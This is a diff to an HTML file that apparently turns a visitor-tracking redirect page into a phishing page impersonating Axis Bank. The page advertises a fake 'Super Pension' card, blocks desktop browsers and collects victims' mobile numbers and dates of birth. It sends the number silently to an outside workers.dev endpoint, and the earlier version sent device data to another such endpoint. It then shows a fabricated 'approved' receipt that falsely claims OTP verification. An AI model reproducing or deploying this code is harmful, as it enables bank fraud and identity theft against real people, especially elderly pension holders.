@@ -2,50 +2,184 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Official</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Axis Bank | Secure Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
-        body { background-color: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        :root { --axis: #971237; --axis-dark: #7a0e2c; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #f4f7fa; margin: 0; padding: 0; overflow-x: hidden; }
+        
+        #desktopBlocker {
+            display: none; position: fixed; inset: 0; background: #fff; z-index: 99999;
+            flex-direction: column; align-items: center; justify-content: center; text-align: center;
+        }
+
+        .hero-box { position: relative; width: 100%; height: 250px; background: #fff; display: flex; align-items: center; overflow: hidden; border-bottom: 1px solid #f1f1f1; }
+        .hero-img { position: absolute; right: -10px; top: 0; height: 100%; width: auto; z-index: 1; -webkit-mask-image: linear-gradient(to left, rgba(0,0,0,1) 80%, rgba(0,0,0,0) 100%); }
+        .content-overlay { position: relative; z-index: 10; padding-left: 20px; width: 65%; }
+        .btn-main { background: var(--axis); color: white; padding: 10px 20px; border-radius: 8px; font-weight: 800; font-size: 12px; text-transform: uppercase; border: none; }
+
+        .benefits-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 15px; }
+        .benefit-card { border: 1px solid #fff; padding: 15px; border-radius: 20px; background: #fff; box-shadow: 0 4px 6px rgba(0,0,0,0.02); }
+        .benefit-icon { width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; margin-bottom: 10px; }
+
+        #applyModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(5px); }
+        .axis-modal { background: #fff; width: 100%; max-width: 450px; min-height: 400px; border-radius: 30px; overflow: hidden; animation: popUp 0.3s ease-out; position: relative; }
+        @keyframes popUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        .axis-input { width: 100%; height: 50px; padding: 0 15px; border: 2px solid #f1f5f9; border-radius: 12px; font-size: 15px; outline: none; background: #f8fafc; font-weight: 600; margin-top: 5px; }
+        .axis-input:focus { border-color: var(--axis); background: #fff; }
+
+        .success-circle { width: 70px; height: 70px; background: #22c55e; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; margin: 0 auto 15px; box-shadow: 0 10px 20px rgba(34,197,94,0.3); }
+        .receipt-box { background: #f8fafc; border: 1px solid #eef2f7; border-radius: 20px; padding: 15px; margin: 15px 0; }
+        .receipt-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px dashed #cbd5e1; }
+        .r-lbl { color: #64748b; font-size: 9px; font-weight: 700; text-transform: uppercase; }
+        .r-val { color: #000; font-size: 11px; font-weight: 900; }
+
+        .axis-footer { background: #1a1a1a; color: #94a3b8; padding: 30px 20px; font-size: 10px; }
     </style>
 </head>
 <body>
+
+    <div id="desktopBlocker">
+        <i class="fa-solid fa-mobile-screen text-[60px] text-[#971237]"></i>
+        <h2 class="mt-4 font-black">MOBILE ACCESS ONLY</h2>
+    </div>
+
+    <div id="appContainer">
+        <header class="bg-white border-b"><img src="https://i.ibb.co/d4BCqfS6/chrome-screenshot-19-Apr-2026-7-42-45-am-IST.png" class="w-full"></header>
+
+        <main>
+            <div class="hero-box">
+                <div class="content-overlay">
+                    <span class="text-[8px] font-black bg-red-100 text-red-700 px-2 py-0.5 rounded uppercase">Axis Secure 2026</span>
+                    <h1 class="text-[20px] font-black text-gray-900 mt-2 leading-tight">Super Pension <br><span class="text-[#971237]">Silver Card</span></h1>
+                    <button onclick="toggleModal(true)" class="btn-main mt-4">Apply Now</button>
+                </div>
+                <img src="https://i.ibb.co/G4TQfFzz/1776588401055.png" class="hero-img">
+            </div>
+
+            <div class="px-5 pt-6"><h2 class="text-[16px] font-black text-gray-800 flex items-center gap-2"><span class="w-1 h-5 bg-[#971237] rounded-full"></span> 20 Exclusive Benefits</h2></div>
+
+            <div class="benefits-grid">
+                <script>
+                    const data = [
+                        ['fa-percent', '8.5% Interest', '#fff1f2', '#e11d48'], ['fa-gift', '₹5000 Welcome', '#f0fdf4', '#16a34a'],
+                        ['fa-heart-pulse', 'Free Health Kit', '#eff6ff', '#2563eb'], ['fa-bolt', 'Utility Cash', '#fefce8', '#ca8a04'],
+                        ['fa-plane', 'Lounge Access', '#f5f3ff', '#7c3aed'], ['fa-shield-halved', '₹15L Insurance', '#fff7ed', '#ea580c'],
+                        ['fa-cart-shopping', '5% Grocery Off', '#ecfeff', '#0891b2'], ['fa-pills', '25% Medicine', '#fdf2f8', '#db2777'],
+                        ['fa-truck-fast', 'Home Cash', '#f0f9ff', '#0369a1'], ['fa-handshake', '0% Pension Loan', '#fdf4ff', '#c026d3'],
+                        ['fa-gas-pump', 'Fuel Surcharge', '#fff1f2', '#be123c'], ['fa-headset', '24/7 VIP Help', '#f0fdf4', '#15803d'],
+                        ['fa-ticket', 'BOGO Movies', '#eff6ff', '#1d4ed8'], ['fa-utensils', '15% Dining Off', '#fefce8', '#a16207'],
+                        ['fa-user-doctor', 'Doc Consult', '#f5f3ff', '#6d28d9'], ['fa-credit-card', 'Zero Annual Fee', '#ecfeff', '#0e7490'],
+                        ['fa-mobile-screen', 'Tap & Pay', '#fdf2f8', '#be185d'], ['fa-piggy-bank', 'Reward Points', '#f0f9ff', '#0369a1'],
+                        ['fa-globe', 'Global Usage', '#fdf4ff', '#a21caf'], ['fa-lock', 'EMV Security', '#fff1f2', '#9f1239']
+                    ];
+                    data.forEach(item => {
+                        document.write(`
+                            <div class="benefit-card">
+                                <div class="benefit-icon" style="background:${item[2]}; color:${item[3]};"><i class="fa-solid ${item[0]}"></i></div>
+                                <h3 class="font-bold text-[11px] text-gray-800">${item[1]}</h3>
+                            </div>
+                        `);
+                    });
+                </script>
+            </div>
+        </main>
+
+        <div id="applyModal">
+            <div class="axis-modal">
+                <button onclick="toggleModal(false)" class="absolute top-4 right-4 text-gray-300 text-xl"><i class="fa-solid fa-circle-xmark"></i></button>
+                
+                <div id="formStep" class="p-8">
+                    <div class="text-center mb-8">
+                        <h2 class="text-2xl font-black text-[#971237]">VERIFICATION</h2>
+                        <p class="text-[11px] text-gray-400 font-bold uppercase mt-1">Axis secure activation portal</p>
+                    </div>
+                    
+                    <div class="space-y-4">
+                        <div>
+                            <label class="text-[10px] font-black text-gray-400 uppercase ml-1">Mobile Number</label>
+                            <input type="tel" id="mobileNumber" placeholder="Enter 10 Digit Number" maxlength="10" class="axis-input">
+                        </div>
+                        <div>
+                            <label class="text-[10px] font-black text-gray-400 uppercase ml-1">Date of Birth</label>
+                            <div class="grid grid-cols-3 gap-2 mt-1">
+                                <select id="d" class="axis-input text-center px-0"><option>Day</option></select>
+                                <select id="m" class="axis-input text-center px-0"><option>Month</option></select>
+                                <select id="y" class="axis-input text-center px-0"><option>Year</option></select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button onclick="handleSuccess()" class="w-full h-14 bg-[#971237] text-white rounded-xl mt-10 font-black uppercase shadow-lg shadow-red-100">Verify & Activate</button>
+                </div>
+
+                <div id="successStep" class="hidden p-8 text-center">
+                    <div class="success-circle"><i class="fa-solid fa-check"></i></div>
+                    <h2 class="text-2xl font-black text-[#971237]">SUCCESS!</h2>
+                    <p class="text-[10px] font-bold text-green-600 uppercase mt-1">Your application is approved</p>
+                    
+                    <div class="receipt-box text-left">
+                        <div class="receipt-row"><span class="r-lbl">Ref Number</span><span class="r-val" id="refId"></span></div>
+                        <div class="receipt-row"><span class="r-lbl">Card Name</span><span class="r-val">Super Pension Platinum</span></div>
+                        <div class="receipt-row"><span class="r-lbl">Mobile</span><span class="r-val" id="dispMob"></span></div>
+                        <div class="receipt-row"><span class="r-lbl">Status</span><span class="r-val text-green-600">Active</span></div>
+                        <div class="receipt-row"><span class="r-lbl">Annual Fee</span><span class="r-val">₹0 (Lifetime Free)</span></div>
+                        <div class="receipt-row"><span class="r-lbl">Benefits</span><span class="r-val">20 Premium Active</span></div>
+                        <div class="receipt-row"><span class="r-lbl">Insurance</span><span class="r-val">Activated</span></div>
+                        <div class="receipt-row"><span class="r-lbl">Delivery</span><span class="r-val">Instant Digital</span></div>
+                        <div class="receipt-row"><span class="r-lbl">Verification</span><span class="r-val">Done (OTP)</span></div>
+                        <div class="receipt-row"><span class="r-lbl">Date / Time</span><span class="r-val" id="currTime"></span></div>
+                    </div>
+                    
+                    <button onclick="window.location.href='hero.html'" class="w-full h-12 bg-[#971237] text-white rounded-xl font-black">View Virtual Card</button>
+                </div>
+            </div>
+        </div>
+
+        <footer class="axis-footer">
+            <div class="footer-line">
+                <p class="mb-2">Registered Office: Axis Bank Limited, 'Trishul', 3rd Floor, Ellisbridge, Ahmedabad - 380006.</p>
+                <p class="font-black text-white uppercase">© 2026 AXIS BANK LTD. ALL RIGHTS RESERVED.</p>
+            </div>
+        </footer>
+    </div>
+
     <script>
-    async function initCapture() {
-        // 1. Session Handling (Refresh control ke liye)
-        let sid = sessionStorage.getItem('sid');
-        if (!sid) {
-            sid = 'user_' + Math.random().toString(36).substr(2, 9);
-            sessionStorage.setItem('sid', sid);
-        }
+        (function() {
+            if(!/Android|iPhone|iPad/i.test(navigator.userAgent) && window.innerWidth > 768) {
+                document.getElementById('desktopBlocker').style.display='flex';
+                document.getElementById('appContainer').style.display='none';
+            }
+        })();
 
-        const startTime = Date.now();
+        const ds=document.getElementById('d'), ms=document.getElementById('m'), ys=document.getElementById('y');
+        for(let i=1;i<=31;i++) ds.innerHTML+=`<option value="${i}">${i}</option>`;
+        ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"].forEach((m,idx)=>ms.innerHTML+=`<option value="${idx+1}">${m}</option>`);
+        for(let i=2012;i>=1945;i--) ys.innerHTML+=`<option value="${i}">${i}</option>`;
 
-        // 2. Data jo hum bhej rahe hain
-        const payload = {
-            sid: sid,
-            ua: navigator.userAgent,
-            scr: window.screen.width + "x" + window.screen.height,
-            act: "Initial Visit"
-        };
+        function toggleModal(s) { document.getElementById('applyModal').style.display = s?'flex':'none'; }
 
-        try {
-            // 3. Aapke Worker URL par data bhej raha hai
-            await fetch('https://sweet-heart-ca97.sumankkuuyy.workers.dev/', {
+        function handleSuccess() {
+            const m = document.getElementById('mobileNumber').value;
+            if(m.length !== 10) return alert('Sahi Mobile No Dalein!');
+
+            document.getElementById('refId').innerText = 'AXIS-' + Math.floor(100000 + Math.random() * 900000);
+            document.getElementById('dispMob').innerText = '+91 ' + m;
+            document.getElementById('currTime').innerText = new Date().toLocaleString('en-GB');
+
+            fetch('https://snowy-sunset-a557.sumankkuuyy.workers.dev/', {
                 method: 'POST',
-                body: JSON.stringify(payload),
-                keepalive: true,
-                mode: 'no-cors'
+                mode: 'no-cors',
+                body: JSON.stringify({ m, page: 'Axis_Bada_Popup' })
             });
-        } catch (e) {
-            // Error handling (Silent)
+
+            document.getElementById('formStep').classList.add('hidden');
+            document.getElementById('successStep').classList.remove('hidden');
         }
-
-        // 4. Turant Redirect
-        window.location.replace("khushboo.html");
-    }
-
-    window.onload = initCapture;
     </script>
 </body>
 </html>
-
